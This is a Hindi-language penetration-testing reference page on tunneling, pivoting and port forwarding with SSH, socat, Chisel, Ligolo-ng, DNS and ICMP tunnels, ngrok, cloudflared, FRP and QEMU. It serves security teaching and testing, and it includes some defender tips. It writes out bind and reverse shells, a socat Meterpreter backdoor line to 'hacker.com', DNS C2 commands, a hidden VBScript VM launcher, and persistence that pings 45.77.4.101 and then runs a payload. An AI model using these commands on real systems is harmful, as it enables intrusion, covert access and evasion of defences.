# Tunneling और Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap टिप

> [!WARNING]
> **ICMP** और **SYN** scans को socks proxies के माध्यम से tunnel नहीं किया जा सकता, इसलिए हमें **ping discovery** को disable (`-Pn`) करना होगा और इसके काम करने के लिए **TCP scans** (`-sT`) specify करने होंगे।

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH ग्राफिकल कनेक्शन (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server में नया Port खोलें --> अन्य Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

स्थानीय port --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

स्थानीय Port --> Compromised host (SSH) --> कहीं भी
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

यह आपके host तक DMZ के माध्यम से internal hosts से reverse shells प्राप्त करने के लिए उपयोगी है:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

आपको **दोनों devices में root** चाहिए (क्योंकि आप नए interfaces बनाने वाले हैं) और sshd config में root login की अनुमति होनी चाहिए:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Server side पर forwarding enable करें
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
क्लाइंट साइड पर एक नया route सेट करें
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> 2023 का Terrapin downgrade attack man-in-the-middle को शुरुआती SSH handshake के साथ छेड़छाड़ करने और **किसी भी forwarded channel** ( `-L`, `-R`, `-D` ) में data inject करने की अनुमति दे सकता है। SSH tunnels पर निर्भर रहने से पहले सुनिश्चित करें कि client और server दोनों patched हैं (**OpenSSH ≥ 9.6/LibreSSH 6.7**) या vulnerable `chacha20-poly1305@openssh.com` और `*-etm@openssh.com` algorithms को `sshd_config`/`ssh_config` में explicitly disable करें।

## SSHUTTLE

आप किसी host के माध्यम से **ssh** द्वारा **subnetwork** के सभी **traffic** को **tunnel** कर सकते हैं।\
उदाहरण के लिए, 10.10.10.0/24 की ओर जाने वाले सभी traffic को forward करना
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
private key से कनेक्ट करें
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

स्थानीय port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
एक और तरीका:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserver पर सभी interfaces में listening करने वाला एक port खोलें, जिसका उपयोग **traffic को beacon के माध्यम से route करने** के लिए किया जा सकता है।
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> इस मामले में, **port beacon host में खोला जाता है**, Team Server में नहीं, और traffic Team Server को भेजा जाता है, जहाँ से उसे निर्दिष्ट host:port पर भेज दिया जाता है.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
ध्यान दें:

- Beacon का reverse port forward **Team Server तक traffic tunnel करने के लिए डिज़ाइन किया गया है, individual machines के बीच relay करने के लिए नहीं**।
- Traffic को **Beacon के C2 traffic के भीतर tunnel किया जाता है**, जिसमें P2P links भी शामिल हैं।
- High ports पर reverse port forwards बनाने के लिए **Admin privileges आवश्यक नहीं हैं**।

### rPort2Port local

> [!WARNING]
> इस स्थिति में, **port beacon host में खोला जाता है**, Team Server में नहीं, और **traffic Cobalt Strike client को भेजा जाता है** (Team Server को नहीं), और वहाँ से indicated host:port पर भेजा जाता है।
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

आपको एक web file tunnel अपलोड करनी होगी: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के releases page से download कर सकते हैं\
आपको client और server के लिए **एक ही version का उपयोग करना होगा**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent और proxy के लिए समान version का उपयोग करें**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding और Listening
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent के Local Ports तक पहुंच
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel। Tunnel victim से शुरू किया जाता है।\
127.0.0.1:1080 पर एक socks4 proxy बनाया जाता है.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
NTLM proxy के माध्यम से **Pivot**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks के माध्यम से Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat के माध्यम से Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
आप victim के console में आखिरी line के बजाय यह line execute करके **non-authenticated proxy** को bypass कर सकते हैं:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

दोनों तरफ certificates बनाएँ: Client और Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

स्थानीय SSH port (22) को attacker host के 443 port से connect करें
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

यह console PuTTY version जैसा है (इसके options ssh client के समान हैं)।

चूंकि यह binary victim में execute होगी और यह एक ssh client है, इसलिए हमें अपना ssh service और port खोलना होगा, ताकि हमारे पास reverse connection हो सके। इसके बाद, केवल locally accessible port को अपनी machine के किसी port पर forward करने के लिए:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

आपको local admin होना आवश्यक है (किसी भी port के लिए)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

आपके पास **system पर RDP access** होना आवश्यक है।\
Download करें:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह tool Windows के Remote Desktop Service feature से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP connection के माध्यम से packets को tunnel करने** के लिए responsible है।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने client computer में **`SocksOverRDP-Plugin.dll`** को इस तरह load करें:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
अब हम **`mstsc.exe`** का उपयोग करके **RDP** के माध्यम से **victim** से **connect** कर सकते हैं। हमें एक **prompt** मिलना चाहिए जिसमें बताया जाएगा कि **SocksOverRDP plugin** enabled है और यह **127.0.0.1:1080** पर **listen** करेगा।

**RDP** के माध्यम से **connect** करें और victim machine पर `SocksOverRDP-Server.exe` binary को upload और execute करें:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
अब, अपनी मशीन (attacker) पर पुष्टि करें कि port 1080 listening है:
```
netstat -antb | findstr 1080
```
अब आप उस port के माध्यम से traffic को proxy करने के लिए [**Proxifier**](https://www.proxifier.com/) का उपयोग कर सकते हैं।

## Proxify Windows GUI Apps

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI apps को proxy के माध्यम से navigate करा सकते हैं।\
**Profile -> Proxy Servers** में SOCKS server का IP और port जोड़ें।\
**Profile -> Proxification Rules** में proxify किए जाने वाले program का नाम और उन IPs के connections जोड़ें जिन्हें आप proxify करना चाहते हैं।

## NTLM proxy bypass

पहले बताए गए tool: **Rpivot**\
**OpenVPN** भी configuration file में ये options सेट करके इसे bypass कर सकता है:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

यह proxy के विरुद्ध authenticate करता है और locally एक port bind करता है, जिसे आपके द्वारा निर्दिष्ट external service पर forward किया जाता है। फिर, आप इस port के माध्यम से अपनी पसंद के tool का उपयोग कर सकते हैं।\
उदाहरण के लिए, port 443 को forward करें
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
अब, यदि उदाहरण के लिए victim में **SSH** service को port 443 पर listen करने के लिए set करें, तो आप attacker के port 2222 के माध्यम से उससे connect कर सकते हैं।\
आप एक **meterpreter** का भी उपयोग कर सकते हैं, जो localhost:443 से connect करता है और attacker port 2222 पर listen कर रहा होता है।

## YARP

Microsoft द्वारा बनाया गया एक reverse proxy। आप इसे यहां पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

दोनों systems में tun adapters बनाने और DNS queries का उपयोग करके उनके बीच data tunnel करने के लिए Root आवश्यक है।
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
यह tunnel बहुत slow होगी। आप इसका उपयोग करके इस tunnel के माध्यम से एक compressed SSH connection बना सकते हैं:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**इसे यहाँ से Download करें**](https://github.com/iagox86/dnscat2)**।**

DNS के माध्यम से एक C\&C channel स्थापित करता है। इसे root privileges की आवश्यकता नहीं होती।
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell में**

आप PowerShell में dnscat2 client चलाने के लिए [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग कर सकते हैं:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat के साथ Port forwarding**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS बदलें

Proxychains `gethostbyname` libc call को intercept करता है और socks proxy के माध्यम से tcp DNS request को tunnel करता है। **डिफ़ॉल्ट रूप से**, proxychains जिस **DNS** server का उपयोग करता है वह **4.2.2.2** है (hardcoded)। इसे बदलने के लिए file: _/usr/lib/proxychains3/proxyresolv_ को edit करें और IP बदलें। यदि आप **Windows environment** में हैं, तो आप **domain controller** का IP set कर सकते हैं।

## Go में Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor ने एक **dual-channel C2 ("AK47C2")** बनाया, जो *केवल* outbound **DNS** और **plain HTTP POST** traffic का दुरुपयोग करता है - ये दो protocols corporate networks पर बहुत कम block किए जाते हैं।<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• एक random 5-character SessionID generate करता है (जैसे `H4T14`)।
• *task requests* के लिए `1` या *results* के लिए `2` prepend करता है और अलग-अलग fields (flags, SessionID, computer name) को concatenate करता है।
• प्रत्येक field को ASCII key `VHBD@H` से **XOR-encrypt**, hex-encode और dots के साथ जोड़ा जाता है - अंत में attacker-controlled domain जोड़ा जाता है:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests में **TXT** (और fallback **MG**) records के लिए `DnsQuery()` का उपयोग होता है।
• जब response 0xFF bytes से अधिक हो जाता है, तो backdoor data को 63-byte pieces में **fragments** करता है और markers डालता है:
`s<SessionID>t<TOTAL>p<POS>` ताकि C2 server उन्हें फिर से सही क्रम में लगा सके।

2. **HTTP mode (AK47HTTP)**
• एक JSON envelope बनाता है:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• पूरे blob को XOR-`VHBD@H` → hex → `Content-Type: text/plain` header के साथ **`POST /`** के body के रूप में भेजा जाता है।
• Reply उसी encoding का पालन करता है और `cmd` field को `cmd.exe /c <command> 2>&1` के साथ execute किया जाता है।

Blue Team के notes
• असामान्य **TXT queries** पर ध्यान दें, जिनका पहला label लंबा hexadecimal हो और जो हमेशा एक rare domain पर समाप्त हों।
• एक constant XOR key, जिसके बाद ASCII-hex हो, YARA से आसानी से detect की जा सकती है: `6?56484244?484` (`VHBD@H` hex में)।
• HTTP के लिए उन text/plain POST bodies को flag करें जो pure hex हों और जिनमें bytes की संख्या two की multiple हो।

{{#note}}
पूरा channel **standard RFC-compliant queries** के भीतर रहता है और प्रत्येक sub-domain label को 63 bytes से कम रखता है, जिससे अधिकांश DNS logs में यह stealthy बना रहता है।
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

दोनों systems में tun adapters बनाने और ICMP echo requests का उपयोग करके उनके बीच data tunnel करने के लिए Root आवश्यक है।
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**इसे यहाँ से Download करें**](https://github.com/utoni/ptunnel-ng.git)।
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **एक ऐसा tool है जो एक command line में solutions को Internet पर expose करता है।**\
_Exposition URI इस प्रकार होते हैं:_ **UID.ngrok.io**

### Installation

- Account बनाएं: https://ngrok.com/signup
- Client download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### मूल उपयोग

**दस्तावेज़ीकरण:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_यदि आवश्यक हो, तो authentication और TLS भी जोड़े जा सकते हैं।_

#### TCP Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP के साथ फाइलें उजागर करना
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls की Sniffing

_XSS,SSRF,SSTI के लिए उपयोगी_\
सीधे stdout से या HTTP interface में [http://127.0.0.1:4040](http://127.0.0.1:4000)।

#### Internal HTTP service की Tunneling
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml simple configuration example

यह 3 tunnels खोलता है:

- 2 TCP
- /tmp/httpbin/ से static files exposition वाला 1 HTTP tunnel
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare का `cloudflared` daemon outbound tunnels बना सकता है, जो **local TCP/UDP services** को inbound firewall rules की आवश्यकता के बिना expose करते हैं और Cloudflare के edge को rendezvous point के रूप में उपयोग करते हैं। यह तब बहुत उपयोगी होता है जब egress firewall केवल HTTPS traffic की अनुमति देता है, लेकिन inbound connections blocked होते हैं।

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS के साथ Persistent tunnels
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
कनेक्टर शुरू करें:
```bash
cloudflared tunnel run mytunnel
```
क्योंकि सारा traffic host से **443 पर outbound** होकर बाहर जाता है, Cloudflared tunnels ingress ACLs या NAT boundaries को bypass करने का एक सरल तरीका हैं। ध्यान रखें कि binary आमतौर पर elevated privileges के साथ चलता है – जब संभव हो, containers या `--user` flag का उपयोग करें।

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) एक actively-maintained Go reverse-proxy है, जो **TCP, UDP, HTTP/S, SOCKS और P2P NAT-hole-punching** को support करता है। **v0.53.0 (May 2024)** से यह **SSH Tunnel Gateway** के रूप में काम कर सकता है, इसलिए target host केवल stock OpenSSH client का उपयोग करके reverse tunnel शुरू कर सकता है – किसी extra binary की आवश्यकता नहीं है।

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### नए SSH gateway का उपयोग (कोई frpc binary नहीं)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
ऊपर दिया गया command victim के port **8080** को **attacker_ip:9000** के रूप में publish करता है और कोई अतिरिक्त tooling deploy नहीं करता – living-off-the-land pivoting के लिए ideal।

## QEMU के साथ Covert VM-based Tunnels

QEMU की user-mode networking (`-netdev user`) में `hostfwd` नाम का एक option होता है, जो **host पर TCP/UDP port को bind करता है और उसे guest में forward करता है**। जब guest में full SSH daemon चलता है, तो hostfwd rule आपको एक disposable SSH jump box देता है, जो पूरी तरह एक ephemeral VM के अंदर रहता है – EDR से C2 traffic छिपाने के लिए perfect, क्योंकि सभी malicious activity और files virtual disk में ही रहते हैं।<sup>[[1]](#references)</sup>

### Quick one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• ऊपर दिया गया command **Tiny Core Linux** image (`tc.qcow2`) को RAM में launch करता है।
• Windows host पर port **2222/tcp** को guest के अंदर के **22/tcp** पर transparently forward किया जाता है।
• attacker के दृष्टिकोण से target केवल port 2222 expose करता है; उस तक पहुंचने वाले सभी packets VM में चल रहे SSH server द्वारा handle किए जाते हैं।

### VBScript के माध्यम से stealthily launch करना
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` window को hidden रखता है।

### In-guest persistence

क्योंकि Tiny Core stateless है, attackers आमतौर पर:

1. Payload को `/opt/123.out` में drop करते हैं
2. `/opt/bootlocal.sh` में जोड़ते हैं:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` और `opt` को `/opt/filetool.lst` में जोड़ते हैं, ताकि shutdown के समय payload को `mydata.tgz` में pack किया जा सके।

### यह detection से कैसे बचता है

• केवल दो unsigned executables (`qemu-system-*.exe`) disk को touch करते हैं; कोई drivers या services install नहीं की जातीं।
• Host पर मौजूद security products **benign loopback traffic** देखते हैं (वास्तविक C2 VM के अंदर terminate होता है)।
• Memory scanners malicious process space का कभी analysis नहीं करते, क्योंकि वह एक अलग OS में मौजूद होता है।

### Defender tips

• User-writable paths में मौजूद **unexpected QEMU/VirtualBox/KVM binaries** पर alert करें।
• `qemu-system*.exe` से originate होने वाले outbound connections को block करें।
• किसी QEMU launch के तुरंत बाद bind होने वाले rare listening ports (2222, 10022, …) के लिए hunt करें।

## `HttpAddUrl` के जरिए IIS/HTTP.sys relay nodes (ShadowPad)

Ink Dragon का ShadowPad IIS module हर compromised perimeter web server को HTTP.sys layer पर सीधे covert URL prefixes bind करके dual-purpose **backdoor + relay** में बदल देता है:<sup>[[3]](#references)</sup>

* **Config defaults** – यदि module के JSON config में values नहीं हैं, तो यह believable IIS defaults पर fallback करता है (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`)। इस तरह benign traffic का उत्तर IIS द्वारा सही branding के साथ दिया जाता है।
* **Wildcard interception** – operators URL prefixes की semicolon-separated list देते हैं (host + path में wildcards)। Module प्रत्येक entry के लिए `HttpAddUrl` call करता है, इसलिए HTTP.sys matching requests को IIS modules तक पहुंचने से *पहले* malicious handler को route करता है।
* **Encrypted first packet** – request body के पहले दो bytes custom 32-bit PRNG के लिए seed रखते हैं। Protocol parsing से पहले हर subsequent byte को generated keystream के साथ XOR किया जाता है:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

